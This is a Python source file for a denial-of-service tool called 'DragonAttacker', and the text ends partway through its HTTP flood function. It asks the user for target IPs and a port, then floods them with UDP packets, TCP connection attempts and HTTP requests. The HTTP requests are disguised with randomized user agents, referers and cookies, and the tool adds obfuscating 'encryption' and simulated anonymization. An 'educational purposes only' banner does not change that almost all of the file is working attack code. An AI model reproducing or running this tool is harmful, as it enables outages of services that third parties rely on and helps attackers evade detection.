import json
import random
import multiprocessing
import time
import socket
import psutil
import logging
import struct
import os
import unittest
from unittest.mock import patch
import asyncio  # For concurrency
import hashlib
import hmac as hmac_lib
from threading import Thread
import uuid
import ipaddress
import sys
import resource  # Add resource module import
import traceback
from multiprocessing import Manager
import ssl

# Add ANSI color codes for terminal formatting
class Colors:
    RED = '\033[91m'
    GREEN = '\033[92m'
    YELLOW = '\033[93m'
    BLUE = '\033[94m'
    PURPLE = '\033[95m'
    CYAN = '\033[96m'
    WHITE = '\033[97m'
    BLACK = '\033[98m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'
    RESET = '\033[0m'

# Custom logger with colors
class ColoredLogger:
    def __init__(self, name):
        self.logger = logging.getLogger(name)
        self.logger.setLevel(logging.INFO)
        
        # Create console handler with a higher log level
        ch = logging.StreamHandler()
        ch.setLevel(logging.INFO)
        
        # Create formatter
        formatter = logging.Formatter('%(asctime)s - %(levelname)s - %(message)s')
        ch.setFormatter(formatter)
        
        # Add the handlers to the logger
        self.logger.addHandler(ch)
    
    def info(self, msg):
        print(f"{Colors.BLUE}[INFO]{Colors.RESET} {msg}")
        self.logger.info(msg)
    
    def warning(self, msg):
        print(f"{Colors.YELLOW}[WARNING]{Colors.RESET} {msg}")
        self.logger.warning(msg)
    
    def error(self, msg):
        print(f"{Colors.RED}[ERROR]{Colors.RESET} {msg}")
        self.logger.error(msg)
    
    def critical(self, msg):
        print(f"{Colors.RED}{Colors.BOLD}[CRITICAL]{Colors.RESET} {msg}")
        self.logger.critical(msg)
    
    def debug(self, msg):
        print(f"{Colors.GREEN}[DEBUG]{Colors.RESET} {msg}")
        self.logger.debug(msg)

# Initialize the colored logger
logger = ColoredLogger("DragonAttacker")

# Default configuration
DEFAULT_CONFIG = {
    "target_ips": [],
    "target_port": 80,
    "packet_size": 1024,
    "num_processes": 10,
    "use_anonymization": False
}

# Ask the user for target information
def ask_for_target_info():
    """
    Interactively ask the user for target information
    """
    config = DEFAULT_CONFIG.copy()
    
    print(f"\n{Colors.CYAN}{Colors.BOLD}====== TARGET CONFIGURATION ======{Colors.RESET}")
    
    # Ask for target IPs
    print(f"\n{Colors.BOLD}Enter target IP addresses{Colors.RESET} (separate multiple IPs with commas):")
    target_ips_input = input(f"{Colors.GREEN}> {Colors.RESET}").strip()
    if target_ips_input:
        # Split and strip whitespace from each IP
        target_ips = [ip.strip() for ip in target_ips_input.split(',')]
        # Validate each IP
        valid_ips = []
        for ip in target_ips:
            try:
                ipaddress.ip_address(ip)
                valid_ips.append(ip)
            except ValueError:
                print(f"{Colors.RED}Invalid IP address: {ip} - skipping{Colors.RESET}")
        
        if valid_ips:
            config["target_ips"] = valid_ips
        else:
            print(f"{Colors.YELLOW}No valid IPs provided, using default: {config['target_ips']}{Colors.RESET}")
    
    # Ask for target port
    print(f"\n{Colors.BOLD}Enter target port{Colors.RESET} (default: {config['target_port']}):")
    port_input = input(f"{Colors.GREEN}> {Colors.RESET}").strip()
    if port_input:
        try:
            port = int(port_input)
            if 1 <= port <= 65535:
                config["target_port"] = port
            else:
                print(f"{Colors.YELLOW}Port must be between 1-65535, using default: {config['target_port']}{Colors.RESET}")
        except ValueError:
            print(f"{Colors.YELLOW}Invalid port, using default: {config['target_port']}{Colors.RESET}")
    
    # Ask for packet size
    print(f"\n{Colors.BOLD}Enter packet size in bytes{Colors.RESET} (default: {config['packet_size']}):")
    size_input = input(f"{Colors.GREEN}> {Colors.RESET}").strip()
    if size_input:
        try:
            size = int(size_input)
            if size > 0:
                config["packet_size"] = size
            else:
                print(f"{Colors.YELLOW}Packet size must be positive, using default: {config['packet_size']}{Colors.RESET}")
        except ValueError:
            print(f"{Colors.YELLOW}Invalid packet size, using default: {config['packet_size']}{Colors.RESET}")
    
    # Ask for number of processes
    print(f"\n{Colors.BOLD}Enter number of processes{Colors.RESET} (1-8, default: {config['num_processes']}):")
    processes_input = input(f"{Colors.GREEN}> {Colors.RESET}").strip()
    if processes_input:
        try:
            processes = int(processes_input)
            if 1 <= processes <= 8:
                config["num_processes"] = processes
            else:
                print(f"{Colors.YELLOW}Number of processes must be between 1-8, using default: {config['num_processes']}{Colors.RESET}")
        except ValueError:
            print(f"{Colors.YELLOW}Invalid number, using default: {config['num_processes']}{Colors.RESET}")
    
    # Ask for anonymization
    print(f"\n{Colors.BOLD}Enable traffic anonymization? (y/n){Colors.RESET} (default: {'yes' if config['use_anonymization'] else 'no'}):")
    anon_input = input(f"{Colors.GREEN}> {Colors.RESET}").strip().lower()
    if anon_input in ('y', 'yes', 'n', 'no'):
        config["use_anonymization"] = anon_input in ('y', 'yes')
    
    # Ask if they want to save this config
    print(f"\n{Colors.BOLD}Save this configuration for future use? (y/n){Colors.RESET}")
    save_input = input(f"{Colors.GREEN}> {Colors.RESET}").strip().lower()
    if save_input in ('y', 'yes'):
        with open("config.json", "w") as config_file:
            json.dump(config, config_file, indent=2)
            print(f"{Colors.GREEN}Configuration saved to config.json{Colors.RESET}")
    
    # Show summary
    print(f"\n{Colors.CYAN}{Colors.BOLD}====== CONFIGURATION SUMMARY ======{Colors.RESET}")
    print(f"{Colors.CYAN}Target IPs:{Colors.RESET} {', '.join(config['target_ips'])}")
    print(f"{Colors.CYAN}Target Port:{Colors.RESET} {config['target_port']}")
    print(f"{Colors.CYAN}Packet Size:{Colors.RESET} {config['packet_size']} bytes")
    print(f"{Colors.CYAN}Processes:{Colors.RESET} {config['num_processes']}")
    print(f"{Colors.CYAN}Anonymization:{Colors.RESET} {'Enabled' if config['use_anonymization'] else 'Disabled'}")
    print()
    
    return config

# Try to load configuration from file or ask user
def load_or_ask_config():
    config_file_path = "config.json"
    
    # Try to load the config file for default values
    try:
        # Try to load the config file
        with open(config_file_path, "r") as config_file:
            loaded_config = json.load(config_file)
            logger.info("Configuration loaded from config.json for default values")
            
            # Create a new config with default values, and update with loaded values
            # This ensures all required keys exist
            config = DEFAULT_CONFIG.copy()
            config.update(loaded_config)
            
            # Additional validation to ensure critical fields are not empty
            if not config["target_ips"]:
                config["target_ips"] = DEFAULT_CONFIG["target_ips"]
                
            # Validate port is in range
            if not (1 <= config["target_port"] <= 65535):
                logger.warning(f"Port {config['target_port']} is out of range - using default")
                config["target_port"] = DEFAULT_CONFIG["target_port"]
            
            # Handle legacy configuration keys
            if "use_anonymization" not in loaded_config:
                # If the legacy keys exist, use them to set use_anonymization
                if "use_tor" in loaded_config or "use_socks_proxy" in loaded_config:
                    config["use_anonymization"] = loaded_config.get("use_tor", False) or loaded_config.get("use_socks_proxy", False)
                    logger.info("Migrated legacy configuration keys to use_anonymization")
            
            # Show current configuration as default values
            print(f"\n{Colors.CYAN}{Colors.BOLD}====== SAVED CONFIGURATION ======{Colors.RESET}")
            print(f"{Colors.CYAN}Default Target IPs:{Colors.RESET} {', '.join(config['target_ips'])}")
            print(f"{Colors.CYAN}Default Target Port:{Colors.RESET} {config['target_port']}")
            print(f"{Colors.CYAN}Default Packet Size:{Colors.RESET} {config['packet_size']} bytes")
            print(f"{Colors.CYAN}Default Processes:{Colors.RESET} {config['num_processes']}")
            print(f"{Colors.CYAN}Default Anonymization:{Colors.RESET} {'Enabled' if config['use_anonymization'] else 'Disabled'}")
            
            # Always ask for target information
            print(f"\n{Colors.BOLD}{Colors.GREEN}You must enter new target information for this session:{Colors.RESET}")
            
            # Temporarily store current values
            old_target_ips = config["target_ips"]
            old_target_port = config["target_port"]
            
            # Always ask for new target IPs
            print(f"\n{Colors.BOLD}Enter target IP addresses{Colors.RESET} (separate multiple IPs with commas):")
            print(f"{Colors.YELLOW}Previous: {', '.join(old_target_ips)}{Colors.RESET}")
            target_ips_input = input(f"{Colors.GREEN}> {Colors.RESET}").strip()
            
            if target_ips_input:
                # Split and strip whitespace from each IP
                target_ips = [ip.strip() for ip in target_ips_input.split(',')]
                # Validate each IP
                valid_ips = []
                for ip in target_ips:
                    try:
                        ipaddress.ip_address(ip)
                        valid_ips.append(ip)
                    except ValueError:
                        print(f"{Colors.RED}Invalid IP address: {ip} - skipping{Colors.RESET}")
                
                if valid_ips:
                    config["target_ips"] = valid_ips
                else:
                    print(f"{Colors.YELLOW}No valid IPs provided, using previous: {', '.join(old_target_ips)}{Colors.RESET}")
            else:
                print(f"{Colors.YELLOW}No input provided, using previous: {', '.join(old_target_ips)}{Colors.RESET}")
            
            # Always ask for target port
            print(f"\n{Colors.BOLD}Enter target port{Colors.RESET} (default: {old_target_port}):")
            port_input = input(f"{Colors.GREEN}> {Colors.RESET}").strip()
            if port_input:
                try:
                    port = int(port_input)
                    if 1 <= port <= 65535:
                        config["target_port"] = port
                    else:
                        print(f"{Colors.YELLOW}Port must be between 1-65535, using previous: {old_target_port}{Colors.RESET}")
                except ValueError:
                    print(f"{Colors.YELLOW}Invalid port, using previous: {old_target_port}{Colors.RESET}")
            
            # Ask for other configuration - optional to change
            print(f"\n{Colors.BOLD}Do you want to update other configuration values (packet size, processes, etc)? (y/n){Colors.RESET}")
            update_other = input(f"{Colors.GREEN}> {Colors.RESET}").strip().lower()
            
            if update_other in ('y', 'yes'):
                # Ask for packet size
                print(f"\n{Colors.BOLD}Enter packet size in bytes{Colors.RESET} (default: {config['packet_size']}):")
                size_input = input(f"{Colors.GREEN}> {Colors.RESET}").strip()
                if size_input:
                    try:
                        size = int(size_input)
                        if size > 0:
                            config["packet_size"] = size
                        else:
                            print(f"{Colors.YELLOW}Packet size must be positive, using previous: {config['packet_size']}{Colors.RESET}")
                    except ValueError:
                        print(f"{Colors.YELLOW}Invalid packet size, using previous: {config['packet_size']}{Colors.RESET}")
                
                # Ask for number of processes
                print(f"\n{Colors.BOLD}Enter number of processes{Colors.RESET} (1-8, default: {config['num_processes']}):")
                processes_input = input(f"{Colors.GREEN}> {Colors.RESET}").strip()
                if processes_input:
                    try:
                        processes = int(processes_input)
                        if 1 <= processes <= 8:
                            config["num_processes"] = processes
                        else:
                            print(f"{Colors.YELLOW}Number of processes must be between 1-8, using previous: {config['num_processes']}{Colors.RESET}")
                    except ValueError:
                        print(f"{Colors.YELLOW}Invalid number, using previous: {config['num_processes']}{Colors.RESET}")
                
                # Ask for anonymization
                print(f"\n{Colors.BOLD}Enable traffic anonymization? (y/n){Colors.RESET} (default: {'yes' if config['use_anonymization'] else 'no'}):")
                anon_input = input(f"{Colors.GREEN}> {Colors.RESET}").strip().lower()
                if anon_input in ('y', 'yes', 'n', 'no'):
                    config["use_anonymization"] = anon_input in ('y', 'yes')
            
    except (FileNotFoundError, json.JSONDecodeError, KeyError) as e:
        logger.warning(f"Config file issue: {e}. Creating a new configuration.")
        
        # If there's a corrupted config file, try to remove it
        if os.path.exists(config_file_path) and not isinstance(e, FileNotFoundError):
            try:
                # Backup the corrupted file first
                backup_path = f"{config_file_path}.bak"
                os.rename(config_file_path, backup_path)
                logger.info(f"Backed up corrupted config to {backup_path}")
            except Exception as backup_error:
                # If backup fails, just delete it
                try:
                    os.remove(config_file_path)
                    logger.info(f"Deleted corrupted config file: {config_file_path}")
                except Exception as del_error:
                    logger.error(f"Failed to remove corrupted config: {del_error}")
        
        # Ask for new configuration
        config = ask_for_target_info()
    
    # Show final configuration summary
    print(f"\n{Colors.CYAN}{Colors.BOLD}====== FINAL CONFIGURATION ======{Colors.RESET}")
    print(f"{Colors.CYAN}Target IPs:{Colors.RESET} {', '.join(config['target_ips'])}")
    print(f"{Colors.CYAN}Target Port:{Colors.RESET} {config['target_port']}")
    print(f"{Colors.CYAN}Packet Size:{Colors.RESET} {config['packet_size']} bytes")
    print(f"{Colors.CYAN}Processes:{Colors.RESET} {config['num_processes']}")
    print(f"{Colors.CYAN}Anonymization:{Colors.RESET} {'Enabled' if config['use_anonymization'] else 'Disabled'}")
    print()
    
    return config

# Generate random strong encryption keys
class CryptoManager:
    """
    Advanced crypto manager with key rotation and stronger encryption
    """
    def __init__(self):
        self.aes_key = os.urandom(32)  # 256-bit key for AES
        self.hmac_key = os.urandom(64)  # 512-bit key for HMAC
        self.last_rotation = time.time()
        self.rotation_interval = 300  # Rotate keys every 5 minutes
        self.cipher_modes = ['ctr', 'cfb', 'ofb']  # Different cipher modes
        self.current_mode = 0
        
    def maybe_rotate_keys(self):
        """Rotate keys periodically for better security"""
        if time.time() - self.last_rotation > self.rotation_interval:
            # Mix in entropy from system state
            system_entropy = str(psutil.cpu_percent()) + str(psutil.virtual_memory()) + str(time.time())
            entropy_hash = hashlib.sha256(system_entropy.encode() + os.urandom(32)).digest()
            
            # XOR with current keys to evolve them rather than replace
            self.aes_key = bytes(a ^ b for a, b in zip(self.aes_key, entropy_hash))
            self.hmac_key = hashlib.sha512(self.hmac_key + entropy_hash).digest()
            
            # Rotate cipher mode too
            self.current_mode = (self.current_mode + 1) % len(self.cipher_modes)
            
            self.last_rotation = time.time()
            logger.debug("Encryption keys and cipher mode rotated")
    
    def get_current_mode(self):
        """Get the current cipher mode"""
        return self.cipher_modes[self.current_mode]
    
    def encrypt(self, data):
        """
        Advanced encryption using multi-layer technique
        """
        self.maybe_rotate_keys()
        
        # Generate strong IV
        iv = os.urandom(16)
        
        # First layer: Basic substitution with different values based on position
        stage1 = bytearray(len(data))
        for i in range(len(data)):
            # Different substitution pattern for each position
            key_byte = self.aes_key[i % len(self.aes_key)]
            iv_byte = iv[i % len(iv)]
            position_salt = (i * 7 + 13) & 0xFF  # Position-dependent salt
            stage1[i] = (data[i] ^ key_byte ^ iv_byte ^ position_salt) & 0xFF
        
        # Second layer: Block-level transformation based on cipher mode
        mode = self.get_current_mode()
        if mode == 'ctr':
            # Counter mode simulation
            counter = 0
            for i in range(0, len(stage1), 16):
                block = stage1[i:i+16]
                counter_bytes = counter.to_bytes(16, byteorder='big')
                for j in range(len(block)):
                    if i+j < len(stage1):
                        stage1[i+j] = (stage1[i+j] + counter_bytes[j % 16]) & 0xFF
                counter += 1
        elif mode == 'cfb':
            # CFB mode simulation
            prev_block = iv
            for i in range(0, len(stage1), 16):
                block = stage1[i:i+16]
                for j in range(len(block)):
                    if i+j < len(stage1):
                        stage1[i+j] = (stage1[i+j] ^ prev_block[j % 16]) & 0xFF
                prev_block = bytes(stage1[i:i+16])
        elif mode == 'ofb':
            # OFB mode simulation
            feedback = iv
            for i in range(0, len(stage1), 16):
                # Generate keystream from feedback
                keystream = bytes(x ^ y for x, y in zip(feedback, self.aes_key[:16]))
                # XOR with data
                for j in range(len(keystream)):
                    if i+j < len(stage1):
                        stage1[i+j] = stage1[i+j] ^ keystream[j]
                # Update feedback
                feedback = keystream
        
        # Append metadata for decryption (IV and mode)
        mode_byte = self.cipher_modes.index(mode).to_bytes(1, byteorder='big')
        return iv + mode_byte + bytes(stage1)
    
    def sign(self, data):
        """
        Generate a cryptographically strong signature
        """
        self.maybe_rotate_keys()
        
        # Use HMAC-SHA512 for stronger signatures
        h = hmac_lib.new(self.hmac_key, data, hashlib.sha512)
        signature = h.digest()
        
        # Add timestamp to prevent replay attacks
        timestamp = int(time.time()).to_bytes(8, byteorder='big')
        
        return timestamp + signature

# Initialize crypto manager
crypto_manager = CryptoManager()

def encrypt_payload(payload):
    """
    Encrypt payload using advanced encryption
    """
    return crypto_manager.encrypt(payload)

def sign_payload(payload):
    """
    Sign payload using advanced signature
    """
    return crypto_manager.sign(payload)

class LocalProxy:
    """
    A simple local SOCKS-like proxy implementation for basic traffic anonymization.
    This replaces the dependency on external Tor/VPN services.
    """
    def __init__(self):
        self.enabled = False
        self.hop_count = 3  # Number of random hops for basic anonymization
        self.proxy_thread = None
    
    def enable(self):
        """Enable the local proxy"""
        self.enabled = True
        logger.info("Local anonymization proxy enabled with {} hops".format(self.hop_count))
        # In a real implementation, this would set up a local proxy server
        # For the educational version, we'll simulate this
        self.proxy_thread = Thread(target=self._proxy_loop, daemon=True)
        self.proxy_thread.start()
    
    def disable(self):
        """Disable the local proxy"""
        self.enabled = False
        logger.info("Local anonymization proxy disabled")
    
    def _proxy_loop(self):
        """Simulate proxy operation"""
        while self.enabled:
            time.sleep(10)  # Simulate proxy activity
            logger.debug(f"Proxy hop simulation active with {self.hop_count} hops")
    
    def rotate_identity(self):
        """Simulate rotating the connection identity"""
        if self.enabled:
            logger.info("Rotating anonymization identity")
            # In a real implementation, this would change routes/IPs
            # For the educational version, we just log this
            return True
        return False

# Initialize the local proxy
local_proxy = LocalProxy()

def setup_anonymization():
    """
    Set up traffic anonymization using the local proxy instead of Tor.
    """
    if config["use_anonymization"]:
        try:
            local_proxy.enable()
            logger.info("Anonymization enabled.")
            return True
        except Exception as e:
            logger.error(f"Error setting up anonymization: {e}")
            return False
    return False

def rotate_identity(retries=3):
    """
    Rotate the anonymized identity with retry mechanism.
    """
    if config["use_anonymization"]:
        for attempt in range(retries):
            try:
                if local_proxy.rotate_identity():
                    logger.info("Identity rotated successfully.")
                    return True
                time.sleep(2)  # Wait before retry
            except Exception as e:
                logger.error(f"Error rotating identity (attempt {attempt + 1}): {e}")
                time.sleep(5)  # Delay between retries
        logger.critical("Failed to rotate identity after multiple attempts.")
        return False
    return True

def limit_system_resources():
    """
    Limit system resources (CPU and Memory) using process-based limits
    instead of cgroups for better portability.
    """
    try:
        # Set process-level soft limits
        max_memory = int(psutil.virtual_memory().total * (config["max_memory_usage"] / 100))
        
        # Use resource module for memory limits
        resource.setrlimit(resource.RLIMIT_AS, (max_memory, max_memory))
        logger.info(f"Memory usage limited to {config['max_memory_usage']}% via resource module")
        
        # CPU limiting via process priority
        os.nice(10)  # Lower priority (higher nice value = lower priority)
        logger.info("Process priority adjusted to limit CPU usage")
        
        return True
    except Exception as e:
        logger.error(f"Error limiting system resources: {e}")
        return False

def generate_random_iv():
    """
    Generate a random Initialization Vector (IV) for encryption.
    """
    return os.urandom(16)

class IPAddressGenerator:
    """Generate random IP addresses."""
    
    @staticmethod
    def get_random_ip(use_ipv6=False):
        """Generate a random IP address."""
        if use_ipv6:
            # Just generate a random hex-based IPv6 address
            parts = []
            for _ in range(8):
                parts.append(f"{random.randint(0, 0xffff):x}")
            return ":".join(parts)
        else:
            # Return a random IPv4 address
            return f"{random.randint(1,223)}.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(1,254)}"

class SimpleBehavioralAnalysis:
    """
    A simplified behavioral analysis class that doesn't rely on sklearn.
    """
    def __init__(self, window_size=100):
        self.window_size = window_size
        self.cpu_samples = []
        self.memory_samples = []
        self.network_samples = []
        self.threshold = 2.0  # Standard deviations from mean
    
    def add_sample(self):
        """Add a new sample of system metrics"""
        cpu = psutil.cpu_percent(interval=0.1)
        memory = psutil.virtual_memory().percent
        network = psutil.net_io_counters().bytes_sent + psutil.net_io_counters().bytes_recv
        
        # Add samples to window
        self.cpu_samples.append(cpu)
        self.memory_samples.append(memory)
        self.network_samples.append(network)
        
        # Trim to window size
        if len(self.cpu_samples) > self.window_size:
            self.cpu_samples.pop(0)
            self.memory_samples.pop(0)
            self.network_samples.pop(0)
    
    def check_anomalies(self):
        """Check for anomalies using simple statistical methods"""
        if len(self.cpu_samples) < 10:  # Need minimum samples
            return False
            
        # Calculate mean and standard deviation
        cpu_mean = sum(self.cpu_samples) / len(self.cpu_samples)
        cpu_std = (sum((x - cpu_mean) ** 2 for x in self.cpu_samples) / len(self.cpu_samples)) ** 0.5
        
        mem_mean = sum(self.memory_samples) / len(self.memory_samples)
        mem_std = (sum((x - mem_mean) ** 2 for x in self.memory_samples) / len(self.memory_samples)) ** 0.5
        
        # Get latest values
        latest_cpu = self.cpu_samples[-1]
        latest_mem = self.memory_samples[-1]
        
        # Check if latest values are anomalous
        cpu_anomaly = abs(latest_cpu - cpu_mean) > (self.threshold * cpu_std)
        mem_anomaly = abs(latest_mem - mem_mean) > (self.threshold * mem_std)
        
        return cpu_anomaly or mem_anomaly

def print_banner():
    """
    Prints a colorful ASCII art banner
    """
    dragon = f"""
{Colors.RED}{Colors.BOLD}             /\\_                   _/\\
            [ {Colors.YELLOW}0{Colors.RED} ]                 [ {Colors.YELLOW}0{Colors.RED} ]
             \\./    {Colors.PURPLE} ▄▄▄▄▄▄▄▄▄▄▄▄▄ {Colors.RED}    \\./ 
     /\\_/\\_/\\/ {Colors.PURPLE}   █ DRAGON █{Colors.RED}    \\/\\_/\\_/\\
     \\/ \\/ \\/    {Colors.PURPLE}█ ATTACKER █{Colors.RED}    \\/ \\/ \\/
     /\\_/\\_/\\    {Colors.PURPLE}▀▀▀▀▀▀▀▀▀▀▀▀▀{Colors.RED}    /\\_/\\_/\\
     \\/ \\/ \\/                       \\/ \\/ \\/
{Colors.RESET}"""
    print(dragon)
    
    print(f"{Colors.YELLOW}{'='*80}{Colors.RESET}")
    print(f"{Colors.RED}{Colors.BOLD}WARNING: This tool is for EDUCATIONAL PURPOSES ONLY.{Colors.RESET}")
    print(f"{Colors.RED}Using this tool against systems without explicit permission is ILLEGAL.{Colors.RESET}")
    print(f"{Colors.RED}The author assumes NO LIABILITY for misuse of this software.{Colors.RESET}")
    print(f"{Colors.YELLOW}{'='*80}{Colors.RESET}")
    print()

def print_stats(cpu_usage, memory_usage, network_io):
    """
    Print system stats with colors and formatting
    """
    # CPU color based on usage
    cpu_color = Colors.GREEN
    if cpu_usage > 70:
        cpu_color = Colors.RED
    elif cpu_usage > 40:
        cpu_color = Colors.YELLOW
    
    # Memory color based on usage
    mem_color = Colors.GREEN
    if memory_usage > 70:
        mem_color = Colors.RED
    elif memory_usage > 40:
        mem_color = Colors.YELLOW
    
    # Format network values to be more readable
    sent_kb = network_io.bytes_sent / 1024
    recv_kb = network_io.bytes_recv / 1024
    
    if sent_kb > 1024:
        sent_str = f"{sent_kb/1024:.2f} MB"
    else:
        sent_str = f"{sent_kb:.2f} KB"
        
    if recv_kb > 1024:
        recv_str = f"{recv_kb/1024:.2f} MB"
    else:
        recv_str = f"{recv_kb:.2f} KB"
    
    print(f"\r{Colors.BOLD}CPU:{Colors.RESET} {cpu_color}{cpu_usage:5.1f}%{Colors.RESET} | "
          f"{Colors.BOLD}RAM:{Colors.RESET} {mem_color}{memory_usage:5.1f}%{Colors.RESET} | "
          f"{Colors.BOLD}NET:{Colors.RESET} {Colors.BLUE}↑{sent_str}{Colors.RESET} {Colors.GREEN}↓{recv_str}{Colors.RESET}", end="")

def monitor_system_resources(stop_event):
    """
    Monitor system resource usage in real-time with colored output.

    Args:
        stop_event: Event to signal when to stop monitoring.

    Returns:
        None
    """
    analyzer = SimpleBehavioralAnalysis()
    logger.info("Monitoring system resources...")
    
    try:
        while not stop_event.is_set():
            cpu_usage = psutil.cpu_percent(interval=1)
            memory_usage = psutil.virtual_memory().percent
            network_io = psutil.net_io_counters()
            
            # Print stats with colors
            print_stats(cpu_usage, memory_usage, network_io)
            
            # Add sample to behavioral analyzer
            analyzer.add_sample()
            
            # Check for anomalies
            if analyzer.check_anomalies():
                print()  # Move to next line
                logger.warning("System behavior anomaly detected!")
            
            time.sleep(1)
    except Exception as e:
        logger.error(f"Error monitoring system resources: {e}")
    finally:
        print()  # Ensure we end on a new line

async def udp_flood_async(target_ip, target_port, packet_size, ipv6=False):
    """
    UDP Flood attack using asyncio.

    Args:
        target_ip (str): Target IP address.
        target_port (int): Target port.
        packet_size (int): Payload size.
        ipv6 (bool): If True, use IPv6; otherwise, use IPv4.

    Returns:
        None
    """
    logger.warning(f"Starting UDP Flood attack on {Colors.BOLD}{target_ip}:{target_port}{Colors.RESET} with packet size {packet_size}...")
    
    packets_sent = 0
    bytes_sent = 0
    
    while True:
        try:
            sock = socket.socket(socket.AF_INET6 if ipv6 else socket.AF_INET, socket.SOCK_DGRAM)
            sock.settimeout(1)  # Timeout
            
            # Generate random payload
            payload = os.urandom(packet_size)
            encrypted_payload = encrypt_payload(payload)
            signed_payload = sign_payload(encrypted_payload)
            
            # Use a random source port
            sock.bind(('', random.randint(1024, 65535)))
            
            sock.sendto(signed_payload, (target_ip, target_port))
            sock.close()
            
            # Update counters
            packets_sent += 1
            bytes_sent += len(signed_payload)
            
            if packets_sent % 100 == 0:
                mb_sent = bytes_sent / (1024 * 1024)
                logger.info(f"UDP Flood: {packets_sent} packets ({mb_sent:.2f} MB) sent to {target_ip}:{target_port}")
            
            await asyncio.sleep(random.uniform(0.001, 0.1))  # Random delay
        except Exception as e:
            logger.error(f"Error during UDP Flood: {e}")

def syn_flood(target_ip, target_port, ipv6=False):
    """
    SYN Flood attack using raw sockets.
    """
    logger.warning(f"Starting SYN Flood attack on {Colors.BOLD}{target_ip}:{target_port}{Colors.RESET}...")
    
    packets_sent = 0
    
    while True:
        try:
            # Create a new socket for each connection attempt
            sock = socket.socket(socket.AF_INET6 if ipv6 else socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(1)
            
            # Use a random source port
            sock.bind(('', random.randint(1024, 65535)))
            
            # Attempt connection but don't complete handshake
            sock.connect_ex((target_ip, target_port))
            sock.close()
            
            # Update counter
            packets_sent += 1
            
            if packets_sent % 100 == 0:
                logger.info(f"SYN Flood: {packets_sent} packets sent to {target_ip}:{target_port}")
            
            time.sleep(random.uniform(0.001, 0.1))  # Random delay
        except Exception as e:
            logger.error(f"Error during SYN Flood: {e}")

async def http_flood_async(target_ip, target_port, packet_size, ipv6=False):
    """
    HTTP Flood attack with advanced request forgery and header manipulation.
    
    Args:
        target_ip (str): Target IP address.
        target_port (int): Target port.
        packet_size (int): Base payload size.
        ipv6 (bool): If True, use IPv6; otherwise, use IPv4.
    """
    logger.warning(f"Starting HTTP Flood attack on {Colors.BOLD}{target_ip}:{target_port}{Colors.RESET} with advanced techniques...")
    
    packets_sent = 0
    bytes_sent = 0
    
    # Common user agents to disguise requests
    user_agents = [
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.1 Safari/605.1.15",
        "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.107 Safari/537.36",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:90.0) Gecko/20100101 Firefox/90.0",
        "Mozilla/5.0 (iPhone; CPU iPhone OS 14_7_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.2 Mobile/15E148 Safari/604.1"
    ]
    
    # HTTP methods to use
    http_methods = ["GET", "POST", "HEAD", "PUT", "DELETE", "OPTIONS"]
    
    # Common paths to request
    paths = [
        "/", "/index.html", "/api/", "/login", "/admin", "/wp-login.php", 
        "/register", "/upload", "/images", "/includes/config.php",
        "/admin/config.php", "/search", "/forum", "/includes/js/",
        "/checkout", "/cart", "/account", "/profile", "/settings"
    ]
    
    # Common file extensions
    extensions = ["php", "html", "asp", "aspx", "jsp", "json", "xml", "js", "css", "txt"]
    
    # Generate random parameter names for POST/GET
    param_names = ["id", "user", "page", "query", "search", "token", "auth", 
                   "session", "item", "product", "category", "sort", "order", 
                   "limit", "offset", "start", "end", "filter", "format"]
    
    while True:
        try:
            # Create socket
            sock = socket.socket(socket.AF_INET6 if ipv6 else socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(3)  # Longer timeout for HTTP connections
            
            # Connect to target
            sock.connect((target_ip, target_port))
            
            # Select random method
            method = random.choice(http_methods)
            
            # Generate random path
            base_path = random.choice(paths)
            if random.random() < 0.3 and method == "GET":  # 30% chance to add extension for GET
                base_path += "." + random.choice(extensions)
            
            # Add random query parameters for GET requests
            if method == "GET" and random.random() < 0.7:  # 70% chance
                params = []
                for _ in range(random.randint(1, 5)):
                    param_name = random.choice(param_names)
                    param_value = hashlib.md5(os.urandom(8)).hexdigest()[:10]  # Random value
                    params.append(f"{param_name}={param_value}")
                path = base_path + "?" + "&".join(params)
            else:
                path = base_path
            
            # Generate random user agent
            user_agent = random.choice(user_agents)
            
            # Generate random referer
            referers = [
                f"https://www.google.com/search?q={target_ip}",
                f"https://www.facebook.com/{target_ip}",
                f"https://www.bing.com/search?q={target_ip}",
                f"https://twitter.com/search?q={target_ip}",
                f"https://www.linkedin.com/search/results/all/?keywords={target_ip}",
                f"https://{IPAddressGenerator.get_random_ip()}/refer"
            ]
            referer = random.choice(referers)
            
            # Generate random acceptable content types
            accept_types = [
                "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
                "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
                "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8",
                "application/json,text/plain,*/*",
                "*/*"
            ]
            accept = random.choice(accept_types)
            
            # Generate request headers
            headers = [
                f"{method} {path} HTTP/1.1",
                f"Host: {target_ip}:{target_port}",
                f"User-Agent: {user_agent}",
                f"Accept: {accept}",
                f"Accept-Language: en-US,en;q=0.9,fr;q=0.8",
                f"Accept-Encoding: gzip, deflate",
                f"Referer: {referer}",
                f"Connection: keep-alive",
                f"Cache-Control: max-age={random.randint(0, 3600)}"
            ]
            
            # Sometimes add cookies
            if random.random() < 0.7:  # 70% chance to add cookies
                session_id = hashlib.sha256(os.urandom(16)).hexdigest()
                user_id = random.randint(1000, 9999)
                headers.append(f"Cookie: session={session_id}; user_id={user_id}; visited=true; theme=dark")
            
            # For POST requests, add content-type and data
            body = ""
            if method == "POST" or method == "PUT":
                content_types = [
                    "application/x-www-form-urlencoded",
                    "application/json", 
                    "multipart/form-data; boundary=----WebKitFormBoundary7MA4YWxkTrZu0gW",
                    "text/plain"
                ]
                content_type = random.choice(content_types)
                headers.append(f"Content-Type: {content_type}")
                
                # Generate body based on content type
                if content_type == "application/x-www-form-urlencoded":
                    form_data = []
                    for _ in range(random.randint(1, 10)):
